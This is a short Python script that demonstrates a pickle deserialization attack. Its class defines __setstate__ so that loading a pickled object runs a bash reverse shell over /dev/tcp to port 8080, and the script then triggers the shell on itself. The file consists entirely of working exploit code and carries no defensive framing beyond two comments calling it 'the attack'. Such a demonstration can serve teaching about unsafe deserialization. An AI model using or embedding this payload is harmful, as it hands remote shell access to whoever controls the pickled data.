import pickle
import os

class foobar:
    def __init__(self):
        pass
    
    def __getstate__(self):
        return self.__dict__

    def __setstate__(self, state):
        # the attack is from localhost
        # the attack is listening on port 8080
        os.system(
            '/bin/bash -c "/bin/bash -i >& /dev/tcp/localhost/8080 0>&1"'
        )

my_foobar = foobar()
my_pickle = pickle.dumps(my_foobar)
my_unpickle = pickle.loads(my_pickle)